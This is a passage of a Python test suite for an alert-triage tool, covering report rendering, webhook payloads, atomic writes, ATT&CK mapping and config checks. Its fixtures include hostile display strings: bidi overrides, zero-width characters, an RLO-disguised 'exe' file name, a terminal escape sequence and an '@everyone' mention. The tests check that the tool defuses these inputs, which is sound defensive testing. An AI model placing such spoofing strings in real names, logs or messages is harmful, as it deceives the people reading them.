        directory = tempfile.mkdtemp()
        try:
            broken = load_config()
            broken.pop("intel_modifiers")
            path = os.path.join(directory, "triage.json")
            with open(path, "w", encoding="utf-8") as handle:
                json.dump(broken, handle)
            code, message = self._run(
                ["-i", self.SAMPLES, "-c", path, "--quiet", "--no-cache"]
            )
            self.assertEqual(2, code)
            self.assertIn("intel_modifiers", message)
            self.assertNotIn("Traceback", message)
        finally:
            shutil.rmtree(directory, ignore_errors=True)


class TestRenderingHardening(unittest.TestCase):
    """Bidi and zero-width characters make a rendered command line read as the
    opposite of what ran; neither renderer may pass them through."""

    # Built by code point: a fixture that is itself invisibly reordered would be
    # unreviewable.
    HIDDEN = tuple(chr(point) for point in
                   (0x202E, 0x202C, 0x200B, 0x2066, 0x2069, 0xFEFF))
    RLO, PDF, ZWSP, LRI, PDI, BOM = HIDDEN

    BIDI = [
        {"Severity": "High", "RuleId": "BIDI", "Rule": "Rule" + RLO + "reversed" + PDF + " name",
         "Attack": "T1059", "Time": "2026-08-20T09:00:00", "User": "CORP\\jdoe",
         "CommandLine": "echo " + ZWSP + "hidden" + LRI + " text" + PDI + BOM},
        {"Severity": "High", "RuleId": "NULLUSER", "Rule": "No account on the finding",
         "Attack": "T1059", "Time": "2026-08-20T09:01:00", "User": None,
         "CommandLine": "whoami /all"},
    ]

    def setUp(self):
        report.enable_color(False)
        self.alerts, self.cases = engine.run(self.BIDI, load_config(), offline_enricher())
        self.meta = {"generated": "now", "version": "test", "input": "bidi.json",
                     "finding_count": len(self.BIDI), "enrichment": "offline",
                     "lookups": 0, "cache_hits": 0, "min_band": "Informational"}

    def test_no_bidi_or_zero_width_character_reaches_the_console(self):
        captured = io.StringIO()
        stdout, sys.stdout = sys.stdout, captured
        try:
            report.print_console(self.alerts, self.cases, self.meta)
        finally:
            sys.stdout = stdout
        text = captured.getvalue()
        for character in self.HIDDEN:
            self.assertNotIn(character, text)
        self.assertIn("reversed", text, "the text itself must survive, only the control does not")

    def test_the_html_report_neutralises_them_and_survives_a_null_account(self):
        directory = tempfile.mkdtemp()
        try:
            path = report.write_html(os.path.join(directory, "bidi.html"),
                                     self.alerts, self.cases, self.meta)
            with open(path, encoding="utf-8") as handle:
                document = handle.read()
            for character in self.HIDDEN:
                self.assertNotIn(character, document)
            self.assertNotIn(">None<", document,
                             "a finding with no User must render a fallback, not 'None'")
            self.assertGreater(len(document), 1000)
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_a_failed_render_leaves_the_previous_report_intact(self):
        directory = tempfile.mkdtemp()
        try:
            path = os.path.join(directory, "demo.html")
            report.write_html(path, self.alerts, self.cases, self.meta)
            with open(path, "rb") as handle:
                good = handle.read()
            with self.assertRaises(Exception):
                report.write_html(path, self.alerts, None, self.meta)
            with open(path, "rb") as handle:
                self.assertEqual(good, handle.read(),
                                 "a report is a deliverable; a failed run must not destroy it")
        finally:
            shutil.rmtree(directory, ignore_errors=True)


class TestAttackCoverage(unittest.TestCase):
    def test_system_owner_discovery_is_mapped(self):
        self.assertEqual(["Discovery"], attack.tactics("T1033"))

    def test_cloud_credential_theft_is_credential_access(self):
        self.assertEqual(["Credential Access"], attack.tactics("T1552"))

    def test_every_mapped_tactic_is_a_tactic_the_kill_chain_knows(self):
        # A typo in the table would otherwise surface as an IndexError at sort time.
        for technique, tactic in attack.TECHNIQUE_TACTIC.items():
            self.assertIn(tactic, attack.TACTIC_ORDER, technique)

    def test_every_configured_playbook_tactic_is_reachable(self):
        mapped = set(attack.TECHNIQUE_TACTIC.values())
        for tactic in load_config()["playbooks"]:
            if not tactic.startswith("_"):
                self.assertIn(tactic, mapped, f"no technique maps to the '{tactic}' playbook")


class TestUntrustedTextReachesEveryRenderer(unittest.TestCase):
    """The webhook is the third surface an attacker-chosen name is displayed on,
    and it needs the same neutralising the console and the HTML get."""

    HOSTILE = "‮exe.gnp\x1b[41;97m​؜"

    def _case(self, **overrides):
        case = {
            "account": "CORP\\" + self.HOSTILE, "account_type": "standard", "score": 96,
            "band": {"name": "Critical", "queue": "Tier 2"}, "alert_count": 3,
            "tactics": ["Execution"], "bad_indicators": {self.HOSTILE: "malicious"},
            "first_seen": "2026-08-20 03:00:00", "last_seen": "2026-08-20 03:10:00",
            "summary": "summary " + self.HOSTILE,
        }
        case.update(overrides)
        return case

    def test_no_platform_payload_carries_escapes_or_bidi(self):
        for platform in ("slack", "discord", "teams"):
            wire = json.dumps(notify.build_payload([self._case()], platform, "src"))
            for char, name in (("‮", "RLO"), ("\x1b", "ESC"),
                               ("؜", "ALM"), ("​", "ZWSP")):
                self.assertNotIn(char, wire, f"{name} survived into the {platform} payload")

    def test_broadcast_tokens_are_still_defused(self):
        wire = json.dumps(notify.build_payload([self._case(summary="ping @everyone now")],
                                               "slack", "src"))
        self.assertNotIn("@everyone", wire)

    def test_a_case_with_no_account_name_never_renders_none(self):
        case = self._case(account=None, account_key=None, first_seen=None, last_seen=None)
        self.assertEqual("an unnamed account", notify._case_account(case))
        self.assertNotIn("None", json.dumps(notify.build_payload([case], "slack", "src")))

    def test_soft_hyphen_and_line_separator_are_neutralised(self):
        self.assertEqual("ab", report.neutralise("a­b"))
        self.assertEqual("ab", report.neutralise("a b"))


class TestReportWritesAreAtomic(unittest.TestCase):
    """A lone surrogate survives json.load, so the failure lands mid-write: the
    destination must be the old report or the whole new one, never a stub."""

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dir, True)
        self.path = os.path.join(self.dir, "report.html")

    def _read(self):
        with open(self.path, encoding="utf-8") as handle:
            return handle.read()

    def test_a_failed_render_leaves_the_previous_report_intact(self):
        report.write_text(self.path, "GOOD REPORT")
        original = self._read()
        try:
            report.write_html(self.path, None, None, None)  # raises inside rendering
        except Exception:
            pass
        self.assertEqual(original, self._read())

    def test_an_unencodable_character_never_truncates_the_file(self):
        report.write_text(self.path, "GOOD REPORT")
        report.write_text(self.path, "kept \ud800 written")
        written = open(self.path, encoding="utf-8").read()
        self.assertIn("kept", written)
        self.assertIn("written", written)

    def test_no_partial_file_is_left_behind(self):
        report.write_text(self.path, "done")
        self.assertEqual(["report.html"], os.listdir(self.dir))


class TestUnwritableOutputPath(unittest.TestCase):
    def test_a_bad_path_is_an_error_message_not_a_traceback(self):
        stderr, sys.stderr = sys.stderr, io.StringIO()
        try:
            with self.assertRaises(SystemExit) as caught:
                cli._write(report.write_text, "JSON", os.path.join("Z:\\", "no", "x.json"), "{}")
            message = sys.stderr.getvalue()
        finally:
            sys.stderr = stderr
        self.assertEqual(2, caught.exception.code)
        self.assertIn("could not write", message)


class TestDocumentStaysAttachable(unittest.TestCase):
    """The report has to fit in a ticket, so every cap must hold and must say in
    the document that it held."""

    def _cases(self, count):
        config = load_config()
        findings = [
            {"Severity": "High", "RuleId": "R", "Rule": "Rule", "Attack": "T1059",
             "Time": "2026-08-20T09:00:%02d" % (i % 60), "Source": "PS4104",
             "Host": "HOST-%d" % i, "User": "CORP\\user%d" % i,
             "CommandLine": "powershell.exe -c whoami"}
            for i in range(count)
        ]
        return engine.run(findings, config, offline_enricher())

    def test_a_queue_of_many_cases_is_capped_and_says_so(self):
        alerts, cases = self._cases(report.MAX_CASES + 40)
        meta = {"generated": "now", "version": "test", "input": "x", "finding_count": len(alerts),
                "enrichment": "offline", "lookups": 0, "cache_hits": 0}
        document = report._html_document(alerts, cases, meta)
        self.assertEqual(report.MAX_CASES, document.count('<section class="case"'))
        self.assertIn("highest-risk are", document)
        self.assertIn(str(len(cases)), document)

    def test_the_alert_heading_counts_what_is_actually_rendered(self):
        config = load_config()
        findings = [
            {"Severity": "Low", "RuleId": "R", "Rule": "Rule", "Attack": "T1082",
             "Time": "2026-08-20T09:00:00", "Source": "SECURITY",
             "Host": "HOST", "User": "CORP\\one", "CommandLine": "whoami"}
            for _ in range(report.MAX_ALERTS_PER_CASE + 10)
        ]
        alerts, cases = engine.run(findings, config, offline_enricher())
        meta = {"generated": "now", "version": "test", "input": "x", "finding_count": len(alerts),
                "enrichment": "offline", "lookups": 0, "cache_hits": 0}
        document = report._html_document(alerts, cases, meta)
        self.assertIn("Alerts in this case (%d of %d)"
                      % (report.MAX_ALERTS_PER_CASE, len(findings)), document)


class TestLinkLocalIsNotTheLan(unittest.TestCase):
    def test_the_metadata_endpoint_is_not_discounted(self):
        verdict = Enricher([], cache_path=None).enrich(
            {"type": "ip", "value": "169.254.169.254", "scope": "link_local",
             "role": "destination", "via_decode": False}
        )
        self.assertEqual("unknown", verdict["verdict"])

    def test_it_is_not_looked_up_either(self):
        enricher = Enricher([], cache_path=None)
        enricher.enrich({"type": "ip", "value": "169.254.169.254", "scope": "link_local",
                         "role": "destination", "via_decode": False})
        self.assertEqual(0, enricher.stats["queried"])


class TestReorderedConfigIsAccepted(unittest.TestCase):
    """The README invites people to edit config/triage.json, so the CLI must not
    refuse a hand-reordered file that still scores correctly."""

    def test_bands_listed_in_any_order_still_band_correctly(self):
        config = load_config()
        config["risk_bands"] = list(reversed(config["risk_bands"]))
        for value, expected in ((100, "Critical"), (70, "High"), (45, "Medium"),
                                (25, "Low"), (0, "Informational")):
            self.assertEqual(expected, score.band_for(value, config)["name"], value)

    def test_the_cli_does_not_reject_a_reordered_file(self):
        config = load_config()
        config["risk_bands"] = list(reversed(config["risk_bands"]))
        directory = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, directory, True)
        path = os.path.join(directory, "triage.json")
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(config, handle)
        cli._check_config(config, path)  # must not raise SystemExit

    def test_a_config_with_no_zero_band_is_still_rejected(self):
        config = load_config()
        config["risk_bands"] = [b for b in config["risk_bands"] if b["min_score"] > 0]
        stderr, sys.stderr = sys.stderr, io.StringIO()
        try:
            with self.assertRaises(SystemExit):
                cli._check_config(config, "x")
        finally:
            sys.stderr = stderr


if __name__ == "__main__":
    unittest.main(verbosity=2)
